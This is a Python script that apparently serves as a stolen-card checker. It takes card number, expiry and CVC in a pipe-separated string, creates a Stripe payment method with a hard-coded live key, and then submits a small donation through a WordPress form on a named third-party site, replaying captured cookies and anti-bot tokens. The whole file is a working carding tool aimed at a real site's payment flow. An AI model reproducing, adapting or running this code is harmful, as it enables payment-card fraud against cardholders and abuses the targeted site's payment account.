import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51QUDsh01boZbbINasiJQmHpIDy60cmlFNVgvb3hnPFqNWGGTwJynLpM7twnYRZJwTLcGYDIDOQb0PQTaDCkGYfHe00RbDcKTUa'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '730ad098-053c-4514-abb9-7b5a2b1c43e46f7d93',
	    '__stripe_sid': 'a33b0d6c-6b70-4182-9527-0f883013a110ffcbe9',
	}
	
	headers = {
	    'authority': 'book-shelfie.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=730ad098-053c-4514-abb9-7b5a2b1c43e46f7d93; __stripe_sid=a33b0d6c-6b70-4182-9527-0f883013a110ffcbe9',
	    'origin': 'https://book-shelfie.com',
	    'referer': 'https://book-shelfie.com/support-us/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740051171212',
	}
	
	data = {
	    'data': 'ak_hp_textarea=&ak_js=1740051090753&__fluent_form_embded_post_id=4116&_fluentform_7_fluentformnonce=24a7da72df&_wp_http_referer=%2Fsupport-us%2F&names%5Bfirst_name%5D=Rodam&email=rodamuser20%40gmail.com&payment_input=0&payment_input_custom_0=1&payment_method=stripe&ak_bib=1740051140393&ak_bfs=1740051170353&ak_bkpc=2&ak_bkp=6%2C961%3B8%2C212%3B&ak_bmc=28%3B70%2C2162%3B4%2C584%3B10%2C2269%3B11%2C779%3B22%2C1429%3B7%2C23043%3B&ak_bmcc=7&ak_bmk=&ak_bck=-1%3B1&ak_bmmc=0&ak_btmc=1&ak_bsc=4&ak_bte=98%3B373%2C233%3B116%2C243%3B415%2C118%3B98%2C202%3B169%2C449%3B196%2C184%3B79%2C569%3B97%2C2116%3B150%2C550%3B95%2C669%3B96%2C154%3B1%2C1115%3B62%2C785%3B60%2C1370%3B61%2C23014%3B&ak_btec=16&ak_bmm=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '7',
	}
	
	r2 = requests.post(
	    'https://book-shelfie.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
